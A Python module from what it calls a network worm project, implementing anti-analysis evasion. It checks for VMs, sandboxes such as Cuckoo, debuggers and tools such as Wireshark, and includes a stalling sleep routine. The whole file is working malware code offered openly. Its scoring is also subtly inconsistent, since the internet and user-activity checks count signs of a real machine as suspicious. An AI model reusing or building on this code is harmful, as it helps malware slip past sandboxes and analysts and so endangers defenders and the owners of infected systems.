"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Advanced Evasion Module - Sandbox & VM Detection
Detects virtualized environments and analysis tools
"""


import os
import platform
import subprocess
from typing import Dict, Tuple

import psutil

from utils.logger import logger


class AdvancedEvasion:
    """
    Advanced Evasion Techniques
    Detects sandboxes, VMs, debuggers, and analysis tools
    """

    def __init__(self):
        self.os_type = platform.system()
        self.evasion_score = 0
        self.is_safe_environment = True

    def check_environment(self) -> Tuple[bool, Dict]:
        """
        Comprehensive environment check

        Returns:
            (is_safe, details)
        """
        logger.info("Performing advanced evasion checks")

        checks = {
            "vm_detection": self._detect_vm(),
            "sandbox_detection": self._detect_sandbox(),
            "debugger_detection": self._detect_debugger(),
            "analysis_tools": self._detect_analysis_tools(),
            "internet_check": self._check_internet(),
            "user_activity": self._check_user_activity(),
        }

        # Calculate evasion score
        suspicious_count = sum(1 for v in checks.values() if v)
        self.evasion_score = suspicious_count

        # If 3+ suspicious indicators, probably analysis environment
        self.is_safe_environment = suspicious_count < 3

        if not self.is_safe_environment:
            logger.warning(f"Suspicious environment detected (score: {self.evasion_score}/6)")
        else:
            logger.info(f"Environment appears safe (score: {self.evasion_score}/6)")

        return self.is_safe_environment, checks

    def _detect_vm(self) -> bool:
        """Detect if running in virtual machine"""
        logger.debug("Checking for VM indicators")

        vm_indicators = []

        # Check CPU count (VMs often have limited CPUs)
        cpu_count = psutil.cpu_count()
        if cpu_count <= 2:
            vm_indicators.append("low_cpu_count")

        # Check RAM (VMs often have limited RAM)
        ram_gb = psutil.virtual_memory().total / (1024**3)
        if ram_gb <= 4:
            vm_indicators.append("low_ram")

        # Check for VM-specific processes
        vm_processes = [
            "vmtoolsd",
            "vmwaretray",
            "vmwareuser",  # VMware
            "vboxservice",
            "vboxtray",  # VirtualBox
            "qemu-ga",  # QEMU
            "prl_tools",  # Parallels
        ]

        for proc in psutil.process_iter(["name"]):
            try:
                if proc.info["name"].lower() in [p.lower() for p in vm_processes]:
                    vm_indicators.append(f"vm_process:{proc.info['name']}")
            except Exception:
                pass

        # Check for VM-specific hardware
        if self.os_type == "Windows":
            try:
                result = subprocess.run(
                    ["wmic", "computersystem", "get", "manufacturer"],
                    capture_output=True,
                    text=True,
                    timeout=5,
                )
                manufacturer = result.stdout.lower()

                if any(vm in manufacturer for vm in ["vmware", "virtualbox", "qemu", "xen"]):
                    vm_indicators.append("vm_manufacturer")
            except Exception:
                pass

        is_vm = len(vm_indicators) >= 2

        if is_vm:
            logger.warning(f"VM detected: {vm_indicators}")

        return is_vm

    def _detect_sandbox(self) -> bool:
        """Detect sandbox environment"""
        logger.debug("Checking for sandbox indicators")

        sandbox_indicators = []

        # Check uptime (sandboxes often have very low uptime)
        import time

        boot_time = psutil.boot_time()
        current_time = time.time()
        uptime_seconds = current_time - boot_time
        uptime_minutes = uptime_seconds / 60

        if uptime_minutes < 10:  # Less than 10 minutes
            sandbox_indicators.append("low_uptime")

        # Check for sandbox-specific files/directories
        sandbox_paths = [
            "C:\\analysis",
            "C:\\sandbox",
            "/tmp/analysis",
            "/opt/cuckoo",
        ]

        for path in sandbox_paths:
            if os.path.exists(path):
                sandbox_indicators.append(f"sandbox_path:{path}")

        # Check for sandbox-specific environment variables
        sandbox_env_vars = [
            "SANDBOX",
            "MALWARE_ANALYSIS",
            "CUCKOO",
        ]

        for var in sandbox_env_vars:
            if os.getenv(var):
                sandbox_indicators.append(f"sandbox_env:{var}")

        # Check number of running processes (sandboxes have few)
        process_count = len(list(psutil.process_iter()))
        if process_count < 30:
            sandbox_indicators.append("low_process_count")

        is_sandbox = len(sandbox_indicators) >= 2

        if is_sandbox:
            logger.warning(f"Sandbox detected: {sandbox_indicators}")

        return is_sandbox

    def _detect_debugger(self) -> bool:
        """Detect debugger presence"""
        logger.debug("Checking for debuggers")

        debugger_indicators = []

        # Check for debugger processes
        debugger_processes = [
            "ollydbg",
            "x64dbg",
            "x32dbg",
            "windbg",
            "ida",
            "ida64",
            "idaq",
            "idaq64",
            "gdb",
            "lldb",
            "radare2",
        ]

        for proc in psutil.process_iter(["name"]):
            try:
                proc_name = proc.info["name"].lower()
                if any(dbg in proc_name for dbg in debugger_processes):
                    debugger_indicators.append(f"debugger_process:{proc.info['name']}")
            except Exception:
                pass

        # Windows-specific: Check for debugger via IsDebuggerPresent
        if self.os_type == "Windows":
            try:
                import ctypes

                if ctypes.windll.kernel32.IsDebuggerPresent():
                    debugger_indicators.append("IsDebuggerPresent")
            except Exception:
                pass

        is_debugged = len(debugger_indicators) > 0

        if is_debugged:
            logger.warning(f"Debugger detected: {debugger_indicators}")

        return is_debugged

    def _detect_analysis_tools(self) -> bool:
        """Detect analysis tools"""
        logger.debug("Checking for analysis tools")

        analysis_tools = [
            "wireshark",
            "tcpdump",
            "fiddler",
            "procmon",
            "procexp",
            "processhacker",
            "pestudio",
            "pe-bear",
        ]

        found_tools = []

        for proc in psutil.process_iter(["name"]):
            try:
                proc_name = proc.info["name"].lower()
                if any(tool in proc_name for tool in analysis_tools):
                    found_tools.append(proc.info["name"])
            except Exception:
                pass

        has_analysis_tools = len(found_tools) > 0

        if has_analysis_tools:
            logger.warning(f"Analysis tools detected: {found_tools}")

        return has_analysis_tools

    def _check_internet(self) -> bool:
        """Check for real internet connection"""
        logger.debug("Checking internet connectivity")

        try:
            import socket

            # Try to connect to Google DNS
            socket.create_connection(("8.8.8.8", 53), timeout=3)
            logger.debug("Internet connection verified")
            return True
        except Exception:
            logger.warning("No internet connection detected")
            return False

    def _check_user_activity(self) -> bool:
        """Check for signs of real user activity"""
        logger.debug("Checking for user activity")

        activity_indicators = []

        # Check for browser history
        browser_paths = [
            os.path.expanduser("~/.mozilla/firefox"),
            os.path.expanduser("~/.config/google-chrome"),
            os.path.expanduser("~/AppData/Local/Google/Chrome"),
        ]

        for path in browser_paths:
            if os.path.exists(path):
                activity_indicators.append("browser_data")
                break

        # Check for documents
        docs_path = os.path.expanduser("~/Documents")
        if os.path.exists(docs_path):
            try:
                doc_count = len(os.listdir(docs_path))
                if doc_count > 5:
                    activity_indicators.append("user_documents")
            except Exception:
                pass

        # Check for desktop files
        desktop_path = os.path.expanduser("~/Desktop")
        if os.path.exists(desktop_path):
            try:
                desktop_count = len(os.listdir(desktop_path))
                if desktop_count > 3:
                    activity_indicators.append("desktop_files")
            except Exception:
                pass

        has_activity = len(activity_indicators) >= 2

        if not has_activity:
            logger.warning("Low user activity detected")

        return has_activity

    def sleep_evasion(self, seconds: int = 300):
        """Sleep to evade automated analysis"""
        logger.info(f"Sleeping for {seconds} seconds to evade analysis")

        import time

        time.sleep(seconds)

        logger.info("Sleep evasion complete")


if __name__ == "__main__":
    evasion = AdvancedEvasion()

    print("=" * 60)
    print("ADVANCED EVASION TEST")
    print("=" * 60)

    is_safe, checks = evasion.check_environment()

    print(f"\nEnvironment Safety: {'SAFE' if is_safe else 'SUSPICIOUS'}")
    print(f"Evasion Score: {evasion.evasion_score}/6")
    print("\nChecks:")
    for check, result in checks.items():
        status = "⚠️ DETECTED" if result else "✓ OK"
        print(f"  {check}: {status}")

    print("=" * 60)
